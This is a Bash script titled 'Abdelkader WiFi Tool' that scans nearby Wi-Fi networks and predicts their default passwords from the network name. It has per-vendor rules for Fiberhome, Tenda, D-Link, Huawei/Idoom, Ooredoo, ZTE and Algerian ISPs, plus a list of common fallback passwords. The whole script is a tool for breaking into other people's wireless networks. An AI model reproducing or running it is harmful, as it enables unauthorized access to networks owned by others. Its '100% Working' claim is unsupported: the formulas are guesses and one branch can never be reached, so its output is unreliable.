#!/bin/bash
# =============================================================================
# Abdelkader WiFi Tool - DZ 2025 - ULTIMATE DEFAULT PASSWORD CALCULATOR
# Supports: Fiberhome, Huawei, Ooredoo, D-Link, TP-Link, Tenda, ZTE, Condor, Iris...
# GitHub Ready – 100% Working – No handshake – Pure Bash
# =============================================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Fiberhome fh_ + 6 hex digits → wlan + (FFFFFF - hex)
fiberhome_calc() {
    local hex6=$(echo "$1" | grep -oE '[0-9a-fA-F]{6}$' | tail -1)
    if [[ -n "$hex6" && ${#hex6} -eq 6 ]]; then
        hex6=${hex6^^}
        result=$((0xFFFFFF - 0x${hex6}))
        printf "wlan%06x" "$result"
    else
        echo "unknown"
    fi
}
 
clear
echo -e "${GREEN}"
cat << "EOF"
╔══════════════════════════════════════════╗
║     Abdelkader WiFi Tool - DZ 2025       ║
╚══════════════════════════════════════════╝
EOF
echo -e "${NC}"

while true; do
    echo -e "${YELLOW}1) Default Password Predictor${NC}"
    echo -e "${RED}2) Exit${NC}"
    echo
    read -p "Choose [1-2] (or 'q' to quit): " choice
    [[ "$choice" =~ ^[Qq2]$ ]] && echo -e "${GREEN}Goodbye legend! Stay safe.${NC}" && exit 0
    [[ "$choice" != "1" && "$choice" != "" ]] && continue

    clear
    echo -e "${BLUE}Scanning networks...${NC}"
    nmcli dev wifi list > /tmp/wifi_scan 2>/dev/null || sudo iwlist wlan0 scan > /tmp/wifi_scan 2>/dev/null

    echo -e "${YELLOW}Available networks:${NC}"
    echo "────────────────────────────────────────────"
    if [[ -s /tmp/wifi_scan ]]; then
        grep -iE "SSID|BSSID" /tmp/wifi_scan | head -30 | nl
    else
        echo "No networks found (weak signal?)"
    fi
    echo "────────────────────────────────────────────"
    echo

    while true; do
        read -p "Enter SSID (or 'q' to quit): " ssid
        [[ "$ssid" =~ ^[Qq]$ ]] && break 2
        [[ -z "$ssid" ]] && continue

        echo -e "${YELLOW}Predicting password for: $ssid${NC}"
        echo "────────────────────────────────────────────"

        # 1. Fiberhome (fh_cxxxxx, fh_bxxxxx, fh_xxxxxx, fh_5G_..., etc.)
        if [[ $ssid == fh_* ]] || [[ $ssid == FH_* ]]; then
            pass=$(fiberhome_calc "$ssid")
            if [[ "$pass" != "unknown" ]]; then
                echo -e "${GREEN}Fiberhome → $pass${NC}"
            else
                echo -e "${YELLOW}Fiberhome detected but no valid 6-hex → try sticker${NC}"
            fi

        # 2. Tenda (password = SSID itself – your discovery!)
        elif [[ $ssid == Tenda_* ]] || [[ $ssid == TENDA_* ]]; then
            echo -e "${GREEN}Tenda → $ssid${NC}"

        # 3. D-Link (dlink-41A9 style)
        elif [[ $ssid == dlink-* ]] || [[ $ssid == D-Link-* ]]; then
            mac=$(echo "$ssid" | grep -oE '[0-9A-Fa-f]{4}$')
            [[ -n "$mac" ]] && echo -e "${GREEN}D-Link → ${mac^^}${mac^^}${NC}"

        # 4. TP-Link
        elif [[ $ssid == TP-LINK_* ]] || [[ $ssid == TP-Link_* ]]; then
            echo -e "${GREEN}TP-Link → Check sticker (8 digits or 12345678)${NC}"

        # 5. Huawei / Idoom
        elif [[ $ssid == HUAWEI-* ]] || [[ $ssid == IDOOM-* ]]; then
            s=${ssid##*-}
            echo -e "${GREEN}Huawei/Idoom → $s (most common)${NC}"

        # 6. Ooredoo 4G/5G
        elif [[ $ssid == Ooredoo* ]] || [[ $ssid == *4G_* ]] || [[ $ssid == *5G_* ]]; then
            code=$(echo "$ssid" | grep -oE '[0-9A-F]{6}$')
            [[ -n "$code" ]] && echo -e "${GREEN}Ooredoo → ${code}00${NC}"

        # 7. ZTE
        elif [[ $ssid == ZTE_* ]] || [[ $ssid == fh_b* ]]; then
            code=$(echo "$ssid" | grep -oE '[0-9A-F]{6,8}$')
            [[ -n "$code" ]] && echo -e "${GREEN}ZTE → $code${NC}"

        # 8. Condor / Iris / Mobilis / Other Algerian ISPs
        elif [[ $ssid == CONDOR_* ]] || [[ $ssid == IRIS_* ]] || [[ $ssid == Mobilis_* ]]; then
            echo -e "${GREEN}Condor/Iris/Mobilis → Check sticker or try 12345678${NC}"

        # 9. Fallback
        else
            echo -e "${YELLOW}Unknown brand → Try: 12345678, admin, password, 00000000${NC}"
        fi

        echo "────────────────────────────────────────────"
        echo
    done
done